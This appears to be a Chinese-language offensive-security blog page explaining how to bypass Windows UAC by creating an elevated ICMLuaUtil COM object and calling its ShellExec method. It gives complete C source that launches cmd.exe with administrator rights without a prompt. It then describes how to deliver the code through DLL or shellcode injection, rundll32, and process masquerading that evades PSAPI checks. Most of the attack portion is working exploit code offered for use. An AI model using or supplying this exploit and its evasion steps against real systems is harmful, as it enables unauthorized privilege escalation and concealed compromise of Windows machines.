# 通过com组件BypassUAC

## COM组件简介

> COM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。

com组件本质上是二进制文件\(dll、exe,在windows系统内\),其调用方法与c++的类相似，程序可以通过被称为CLSID\(全局标识符\)作为索引在注册表内找到具体的二进制文件，这篇文章只会介绍应用方法，具体的逆向分析会在之后的文章内详细解释\(等公司买正版ida,现在用的盗版就不拿出来丢人了\)。

windows提供了一种com组件提权的方法，其原意大概是为了方便开发，所以当这种提提权方法的调用者是拥有微软签名的合法程序时\(其本质是校验PEB\)，会忽略uac弹窗，这也为了我们利用该技术埋下了隐患。

```text
HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void ** ppv)
{
    BIND_OPTS3 bo;
    WCHAR  wszCLSID[50];
    WCHAR  wszMonikerName[300];

    StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID)/sizeof(wszCLSID[0])); 
    HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName)/sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
    if (FAILED(hr))
        return hr;
    memset(&bo, 0, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = hwnd;
    bo.dwClassContext  = CLSCTX_LOCAL_SERVER;
    return CoGetObject(wszMonikerName, &bo, riid, ppv);
}
```

在com组件中，有一个名为ICMLuaUtil的接口，这个接口提供了一个名为ShellExec的方法，顾名思义，可以执行任意传入的命令，如果我们能用提权的ICMLuaUtil接口调用ShellExec，那么我们就能获得一个不受限的管理员令牌。

## 流程

1. 初始化com库
2. 创建提升权限的ICMLuaUtil接口
3. 调用ICMLuaUtil的ShellExec方法
4. 弹出一个高权限的calc\(串戏了\)。

## 代码

```text
#include "BypassUAC.h"

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
{

	BIND_OPTS3 bo;
	WCHAR  wszCLSID[50];
	WCHAR  wszMonikerName[300];

	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));

	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;


	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
	CMLuaUtil->lpVtbl->Release(CMLuaUtil);

	if (GetLastError())
	{
		return FALSE;
	}
	else {
		return TRUE;	
	}
}

int main() {
	CoInitialize(NULL);

	CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");
	CoUninitialize();
	return 0;
}
```



![](../.gitbook/assets/image%20%28141%29.png)

## 利用方法

### shellcode&dll注入

把这个代码写成一个dll，然后通过进程注入的方式获得一个合法的进程环境。

shellcode注入和dll注入差不多，只不过注入的具体dll被打成了shellcode，我记得有这么一个开源项目可以做到，原理类似于在dll二进制代码前写一个加载器

### rundll32

rundll32是windows提供的一个合法exe，它能把一个单独的dll拉起来成为一个进程，这也起来的进程也被windows视为合法。

### 伪装进程

原理我之前的文章写过[fakecommandline](../defense-evasion/fake-commandline.md)，这篇文章的基础上再添加对ldr的伪装，就能绕过PSAPI对进程的校验，具体的代码三号学生大佬写过[this](https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IFileOperation%E8%B6%8A%E6%9D%83%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6/)。

## LINKS





